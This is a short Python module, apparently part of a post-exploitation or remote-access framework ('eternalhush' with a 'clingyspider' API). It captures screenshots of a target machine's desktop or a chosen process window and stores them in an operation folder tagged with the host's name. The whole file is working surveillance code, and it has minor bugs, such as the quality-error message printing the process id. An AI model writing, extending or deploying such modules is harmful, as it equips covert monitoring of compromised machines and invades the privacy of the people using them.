import eternalhush as eh
from additional.clingyspider import api
from additional.clingyspider import const
import datetime, os

def main(args):
    if args.pid != None:
        eh.ui.Echo("Taking screenshot of process "+str(args.pid), eh.ECHO_DEFAULT)
        hwnd = api.GetWindowByPid(args.pid)
        if hwnd == 0:
            eh.ui.Echo("Failed to get hwnd of process " +str(args.pid), eh.ECHO_ERROR)
            return
    else:
        eh.ui.Echo("Taking screenshot of desktop", eh.ECHO_DEFAULT)
        hwnd = 0

    if args.quality == None:
        args.quality = 90

    if args.quality not in range(1, 100):
        eh.ui.Echo("Invalid quality (not in 1-100) " +str(args.pid), eh.ECHO_ERROR)
        return

    screenshot_buffer = api.CaptureWindowImage(hwnd, args.quality)
    dt = datetime.datetime.now()
    current_time = dt.strftime("%Y_%m_%d_%Hh%Mm%Ss")
    hostname = eh.ui.GetEnv("CONSOLE_HOSTNAME")
    out_file = os.path.join(eh.ui.GetGlobalEnv("OPERATION_PATH"), "storage/Screenshot_"+hostname+"_"+current_time+".jpg")

    with open(out_file, "wb+") as f:
        f.write(screenshot_buffer)
        eh.ui.Echo("Screenshot saved to " +out_file, eh.ECHO_GOOD)